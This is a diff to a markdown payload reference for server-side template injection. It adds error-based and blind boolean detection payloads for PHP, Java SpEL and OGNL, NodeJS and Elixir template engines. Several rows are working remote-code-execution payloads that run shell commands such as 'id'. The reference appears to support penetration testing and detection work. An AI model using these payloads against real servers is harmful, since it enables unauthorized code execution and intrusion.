@@ -6,6 +6,7 @@
   - [Java](#java)
   - [Ruby](#ruby)
   - [NodeJS](#nodejs)
+  - [Elixir](#elixir)
 - [Boolean Error-Based Blind](#boolean-error-based-blind-boolean-based)
   - [Generic Detection](#generic-detection-1)
   - [Python](#python-1)
@@ -13,6 +14,7 @@
   - [Java](#java-1)
   - [Ruby](#ruby-1)
   - [NodeJS](#nodejs-1)
+  - [Elixir](#elixir-1)
 
 ---
 
@@ -33,11 +35,12 @@
 
 | template       | tag       |
 |----------------|-----------|
-| Tornado        | {{ ... }} |
+| Chameleon      | ${ ... }  |
+| Cheetah3       | ${ ... }  |
 | Mako           | ${ ... }  |
 | SimpleTemplate | {{ ... }} |
-| Cheetah3       | ${ ... }  |
-| Chameleon      | ${ ... }  |
+| Templite       | ${ ... }$ |
+| Tornado        | {{ ... }} |
 
 #### Jinja2
 | type    | payload                                                                                                                  |
@@ -52,29 +55,21 @@
 > [!TIP]
 > Use `ini_set("error_reporting", "1");` to enable verbose error output
 
-| type      | payload                                                                                |
-|-----------|----------------------------------------------------------------------------------------|
-| General 1 | `fopen(join("", ["Y:/A:/", OUTPUT]), "r")`                                             |
-| Eval 1-1  | `fopen(join("", ["Y:/A:/", shell_exec('php -r "echo eval(\'return 7*7;\');"')]), "r")` |
-| Eval 1-2  | `fopen(join("", ["Y:/A:/", eval('return 7*7;')]), "r")`                                |
-| RCE 1     | `fopen(join("", ["Y:/A:/", shell_exec('id')]), "r")`                                   |
-| General 2 | `include(join("", ["Y:/A:/", OUTPUT]))`                                                |
-| Eval 2-1  | `include(join("", ["Y:/A:/", shell_exec('php -r "echo eval(\'return 7*7;\');"')]))`    |
-| Eval 2-2  | `include(join("", ["Y:/A:/", eval('return 7*7;')]))`                                   |
-| RCE 2     | `include(join("", ["Y:/A:/", shell_exec('id')]))`                                      |
-| General 3 | `join("", ["xx", OUTPUT])()`                                                           |
-| Eval 3-1  | `join("", ["xx", shell_exec('php -r "echo eval(\'return 7*7;\');"')])()`               |
-| Eval 3-2  | `join("", ["xx", eval('return 7*7;')])()`                                              |
-| RCE 3     | `join("", ["xx", shell_exec('id')])()`                                                 |
+| type    | payload                                                                                |
+|---------|----------------------------------------------------------------------------------------|
+| General | `call_user_func(join("", ["xx", OUTPUT]))`                                             |
+| Eval 1  | `call_user_func(join("", ["xx", shell_exec('php -r "echo eval(\'return 7*7;\');"')]))` |
+| Eval 2  | `call_user_func(join("", ["xx", eval('return 7*7;')]))`                                |
+| RCE     | `call_user_func(join("", ["xx", shell_exec('id')]))`                                   |
 
 > [!IMPORTANT]
-> Templates can use `General 1`, `Eval 1-1` and `RCE 1` payloads
+> Templates can use `General`, `Eval 1` and `RCE` payloads
 
 | template  | tag       |
 |-----------|-----------|
 | Blade     | {{ ... }} |
-| Smarty    | { ... }   |
 | Latte     | {= ... }  |
+| Smarty    | { ... }   |
 
 #### Twig
 > [!TIP]
@@ -92,11 +87,23 @@
 ---
 
 ### Java
-#### SpEL
+#### SpEL and other ELs
 | type    | payload                                                                                                                                                                                                                                                    |
 |---------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
-| General | `"".getClass().forName('java.lang.Integer').valueOf("x"+OUTPUT)`                                                                                                                                                                                           |
+| General | `T(java.lang.Integer).valueOf("x"+OUTPUT)`                                                                                                                                                                                           |
 | RCE     | `"".getClass().forName('java.lang.Integer').valueOf("x"+''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes()))` |
+
+#### SpEL
+| type    | payload                                                                                                                                                                |
+|---------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
+| General | `T(java.lang.Integer).valueOf("x"+OUTPUT)`                                                                                                                             |
+| RCE     | `T(java.lang.Integer).valueOf("x"+T(java.lang.String).getConstructor(T(byte[])).newInstance(T(java.lang.Runtime).getRuntime().exec("id").inputStream.readAllBytes()))` |
+
+#### OGNL
+| type    | payload                                                                                 |
+|---------|-----------------------------------------------------------------------------------------|
+| General | `OUTPUT/0`                                                                              |
+| RCE     | `(new String(@java.lang.Runtime@getRuntime().exec("id").inputStream.readAllBytes()))/0` |
 
 #### Freemarker
 | type    | payload                                                               |
@@ -144,15 +151,28 @@
 
 | template   | tag                              |
 |------------|----------------------------------|
-| EJS        | <%= ... %>                       |
-| Underscore | <%= ... %>                       |
-| Pug        | #{ ... }                         |
 | DotJS      | {{= ... }}                       |
+| EJS        | <%= ... %>                       |
 | Eta        | <%= ... %>                       |
 | Nunjucks   | {{range.constructor(' ... ')()}} |
+| Pug        | #{ ... }                         |
+| Underscore | <%= ... %>                       |
 
 > [!NOTE]
 > Nunjucks uses `range.constructor(' ... ')()` to evaluate JS code, check quotes in payload
+
+---
+
+### Elixir
+| type    | payload                                    |
+|---------|--------------------------------------------|
+| General | `[1, 2][OUTPUT]`                           |
+| Eval    | `[1, 2][elem(Code.eval_string("7*7"), 0)]` |
+| RCE     | `[1, 2][elem(System.shell("id"), 0)]`      |
+
+| template | tag        |
+|----------|------------|
+| EEx      | <%= ... %> |
 
 ---
 
@@ -178,11 +198,12 @@
 
 | template       | tag       |
 |----------------|-----------|
-| Tornado        | {{ ... }} |
+| Chameleon      | ${ ... }  |
+| Cheetah3       | ${ ... }  |
 | Mako           | ${ ... }  |
 | SimpleTemplate | {{ ... }} |
-| Cheetah3       | ${ ... }  |
-| Chameleon      | ${ ... }  |
+| Templite       | ${ ... }$ |
+| Tornado        | {{ ... }} |
 
 #### Jinja2
 | test | ok                                                                                             | error                                                                                          |
@@ -218,8 +239,8 @@
 | template  | tag       |
 |-----------|-----------|
 | Blade     | {{ ... }} |
-| Smarty    | { ... }   |
 | Latte     | {= ... }  |
+| Smarty    | { ... }   |
 
 #### Twig
 > [!TIP]
@@ -242,7 +263,7 @@
 ---
 
 ### Java
-#### SpEL
+#### SpEL and other ELs
 | test | ok                                                                                                     | error                                                                                                  |
 |------|--------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------|
 | 1    | `"".getClass().forName('java.lang.Integer').valueOf('1')/((1000000000+1000000000==2000000000)?1:0)+""` | `"".getClass().forName('java.lang.Integer').valueOf('1')/((1000000000+2000000000==1000000000)?1:0)+""` |
@@ -251,6 +272,28 @@
 RCE:
 ```java
 1/((''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor()==0)?1:0)+""
+```
+
+#### SpEL
+| test | ok                                                                               | error                                                                            |
+|------|----------------------------------------------------------------------------------|----------------------------------------------------------------------------------|
+| 1    | `T(java.lang.Integer).valueOf('1')/((1000000000+1000000000==2000000000)?1:0)+""` | `T(java.lang.Integer).valueOf('1')/((1000000000+2000000000==1000000000)?1:0)+""` |
+| 2    | `T(java.lang.Integer).valueOf('1')/((2000000000+2000000000==-294967296)?1:0)+""` | `T(java.lang.Integer).valueOf('1')/((2000000000+2000000000==-224667999)?1:0)+""` |
+
+RCE:
+```java
+1/((T(java.lang.Runtime).getRuntime().exec("id").waitFor()==0)?1:0)+""
+```
+
+#### OGNL
+| test | ok                                                                             | error                                                                          |
+|------|--------------------------------------------------------------------------------|--------------------------------------------------------------------------------|
+| 1    | `@java.lang.Integer@valueOf('1')/((1000000000+1000000000==2000000000)?1:0)+""` | `@java.lang.Integer@valueOf('1')/((1000000000+2000000000==1000000000)?1:0)+""` |
+| 2    | `@java.lang.Integer@valueOf('1')/((2000000000+2000000000==-294967296)?1:0)+""` | `@java.lang.Integer@valueOf('1')/((2000000000+2000000000==-224667999)?1:0)+""` |
+
+RCE:
+```java
+1/((@java.lang.Runtime@getRuntime().exec("id").waitFor()==0)?1:0)+""
 ```
 
 #### Freemarker
@@ -314,12 +357,29 @@ RCE:
 
 | template   | tag                              |
 |------------|----------------------------------|
-| EJS        | <%= ... %>                       |
-| Underscore | <%= ... %>                       |
-| Pug        | #{ ... }                         |
 | DotJS      | {{= ... }}                       |
+| EJS        | <%= ... %>                       |
 | Eta        | <%= ... %>                       |
 | Nunjucks   | {{range.constructor(' ... ')()}} |
+| Pug        | #{ ... }                         |
+| Underscore | <%= ... %>                       |
 
 > [!NOTE]
 > Nunjucks uses `range.constructor(' ... ')()` to evaluate JS code, check quotes in payload
+
+---
+
+### Elixir
+| test | ok                                        | error                                     |
+|------|-------------------------------------------|-------------------------------------------|
+| 1    | `1/((String.length("2") == 1)&&1\|\|0)`   | `1/((String.length("1") == 2)&&1\|\|0)`   |
+| 2    | `1/((is_boolean(false) == true)&&1\|\|0)` | `1/((is_boolean(true) == false)&&1\|\|0)` |
+
+| type    | payload                                          |
+|---------|--------------------------------------------------|
+| Eval    | `1/(elem(Code.eval_string("7*7"), 0)&&1\|\|0)`   |
+| RCE     | `1/((elem(System.shell("id"), 1) == 0)&&1\|\|0)` |
+
+| template | tag        |
+|----------|------------|
+| EEx      | <%= ... %> |
